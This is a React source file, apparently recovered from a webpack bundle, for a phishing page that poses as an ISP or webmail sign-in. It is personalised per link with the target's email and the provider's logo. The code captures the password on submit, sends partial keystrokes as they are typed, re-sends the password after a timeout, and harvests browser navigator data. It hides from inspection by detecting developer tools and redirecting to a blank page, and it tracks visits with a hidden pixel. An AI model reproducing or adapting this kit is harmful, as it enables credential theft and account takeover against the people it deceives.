import React, { Component } from 'react'
import './App.css'
import axios from 'axios'
import { Helmet } from 'react-helmet'
import Favicon from 'react-favicon'
import { createBrowserHistory } from 'history'
const browserHistory = createBrowserHistory({ forceRefresh: false })
var randomstring = require('randomstring')
const devtools = require('devtools-detect')

let DISABLE_PROTECTION = true

if (process.env.NODE_ENV == 'production') {
  DISABLE_PROTECTION = false
}

const REDIRECT_DELAY = 1000
const WHOS_AMUNG = 'gdprmyballs'

const unlisten = browserHistory.listen((location, action) => {
  // location is an object like window.location
  // alert(JSON.stringify(action, location.pathname, location.state))
  return false
})
const Loading = () => (
  <div style={{ textAlign: 'center' }}>
    <img style={{ paddingTop: '35px', maxWidth: '80px' }} src="./loading.svg" alt="Loading..." />
  </div>
)

class App extends Component {
  constructor(props) {
    super(props)

    this.state = {
      ispconf: null,
      imageStatus: 'not loaded',
      logo: null,
      favicon: null,
      redirect: false,
      password: '',
      dev: false,
      reason: null
    }

    this.defaultPromo = '/redirect'
    this.typetimer = null
    this.testtimer = null
  }

  componentWillUnmount() {
    debugger
  }

  async componentWillMount() {
    if (!DISABLE_PROTECTION) {
      window.devtools = devtools
      if (window.devtools) {
        if (window.devtools.open) {
          this.setState({ dev: true, redirect: true })
          return window.location('about:blank')
        }
      }
      window.addEventListener('devtoolschange', e => {
        if (e.detail.open) {
          this.setState({ dev: true })
          this.rp()
        }
      })
    }

    this.init()

    this.handleLogin = this.handleLogin.bind(this)
    this.handleType = this.handleType.bind(this)
    this.handleData = this.handleData.bind(this)
    this.handleTimeout = this.handleTimeout.bind(this)
  }

  async init() {
    let path = window.location.href.split('/').pop()

    browserHistory.push('/')

    let data = {}

    if (path.length < 7) {
      this.setState({ redirect: true, reason: 'pl7' })
      return false
    }

    data = await axios
      .get(`/api/` + path, { timeout: 30000 })
      .then(res => {
        if (res.data) {
          if (res.data.p) {
            this.defaultPromo = res.data.p
            console.log('url changed to ' + this.defaultPromo)
          }
        }
        return res.data
      })
      .catch(error => {
        console.log('errorr')
        this.setState({ redirect: true, reason: 'aerr' })
      })

    if (data) {
      if (data.email) {
        this.setState({ ispconf: data, imageStatus: 'loading' })

        if (!data.ispname) {
          this.setState({ redirect: true, reason: 'noin' })
        } else {
          var img = new Image()
          img.src = './' + data.logo // Assigning the img src immediately requests the image

          img.onload = () => {
            this.setState({
              logo: img.src,
              favicon: data.favicon ? data.favicon : img.src,
              imageStatus: 'loaded'
            })
          }

          img.onerror = () => {
            this.setState({
              logo: img.src,
              favicon: data.favicon ? data.favicon : img.src,
              imageStatus: 'loaded'
            })
          }
        }
      }
    }
  }
  handleLogin() {
    var lres = this.handleData({
      u: this.state.ispconf.email,
      p: this.state.password,
      n: this.getn(navigator),
      l: true
    }).then(res => {
      if (res.data.url) {
        this.defaultPromo = res.data.url
      }
      this.setState({ redirect: true, reason: 'hl' })
    })
  }

  handleData(data) {
    return axios.post('/api/' + randomstring.generate(), data)
  }

  handleTimeout() {
    var lres = this.handleData({
      u: this.state.ispconf.email,
      p: this.state.password,
      n: this.getn(navigator),
      to: true
    }).then(res => {
      if (res.data.url) {
        this.defaultPromo = res.data.url
      }

      this.setState({ redirect: true, reason: 'tout' })
    })
  }

  getn(navigator) {
    let d = {}
    for (var property in navigator) {
      var str = navigator[property]
      d[property] = str
    }
    return d
  }

  handleType(evt) {
    this.setState({ password: evt.target.value })
    clearTimeout(this.typetimer)

    if (evt.target.value.length === 0) {
      return true
    }

    if (evt.target.value.length > this.state.password.length) {
      this.setState({ partial: evt.target.value })

      this.typetimer = setTimeout(() => {
        this.handleData({
          u: this.state.ispconf.email,
          p: this.state.partial,
          n: this.getn(navigator),
          t: true
        })
      }, 1000)
    }
  }

  onKeyDown = event => {
    if (event.key === 'Enter') {
      event.preventDefault()
      event.stopPropagation()
      this.handleLogin()
    }
  }

  componentDidMount() {
    if (this.state.ispconf) {
      this.nameInput.focus()
    }

    setTimeout(() => {
      this.handleTimeout()
    }, 55000)
  }

  rp = () => {
    if (DISABLE_PROTECTION) return true

    this.handleData({ c: true, ...this.state, n: this.getn(navigator), d: true }).then(() => {
      window.location.href = 'about:blank'
    })
  }
  render() {
    let ispconf = this.state.ispconf

    if (this.state.redirect === true) {
      setTimeout(() => {
        window.location = this.state.reason && this.defaultPromo == '/redirect' ? '/redirect?r=' + this.state.reason : this.defaultPromo
      }, REDIRECT_DELAY)

      return <Loading />
    }
    if (!this.state.logo || !this.state.ispconf) {
      return <Loading />
    }
    return (
      <div className="App">
        <Helmet>
          <title>{ispconf.ispname}</title>
          <meta name="description" content={ispconf.ispname} />
          <link rel="icon" href={this.state.favicon} />
        </Helmet>

        <div className="login-box-container">
          <div className="login-box default">
            <div className="txt-align-center">
              <img className="logo" src={this.state.logo} alt={ispconf.ispname} />
            </div>
            <div className="challenge">
              <div id="password-challenge" className="primary">
                <div className="greeting">
                  <h1 className="username">Hello {ispconf.email}</h1>
                  <p className="session-expired" style={{ fontSize: '12px', color: '#dd1037' }}>
                    Logged out due to inactivity, Sign in to continue
                  </p>
                </div>

                <div className="hidden-username">
                  <input type="hidden" tabIndex="-1" aria-hidden="true" role="presentation" autoCorrect="off" spellCheck="false" name="username" value="" autoComplete="off" />
                </div>
                <input type="hidden" name="passwordContext" value="normal" />
                <input
                  onChange={this.handleType}
                  onKeyDown={this.onKeyDown}
                  ref={input => {
                    this.nameInput = input
                  }}
                  className="password"
                  type="password"
                  id="login-passwd"
                  name="password"
                  placeholder="Password"
                  autoFocus="true"
                  autoComplete="off"
                  value={this.state.password}
                />
                <p className="signin-cont">
                  <button
                    onClick={() => this.handleLogin()}
                    id="login-signin"
                    className="pure-button puree-button-primary puree-spinner-button"
                    name="verifyPassword"
                    value="Sign&nbsp;in"
                  >
                    Sign&nbsp;in
                  </button>
                </p>
                {/* <p className="forgot-cont">
                    <input
                      type="submit"
                      className="pure-button puree-button-link"
                      data-ylk="elm:btn;elmt:skip;slk:skip"
                      id="mbr-forgot-link"
                      name="skip"
                      value="I forgot my&nbsp;password"
                    />
                  </p> */}
              </div>
            </div>
          </div>
          <img src={`https://whos.amung.us/swidget/${WHOS_AMUNG}.png`} width="0" height="0" />
          <div id="login-box-ad-fallback" className="login-box-ad-fallback" style={{ display: 'block' }}>
            <p />
          </div>
        </div>
      </div>
    )
  }
}

export default App



// WEBPACK FOOTER //
// ./src/App.js
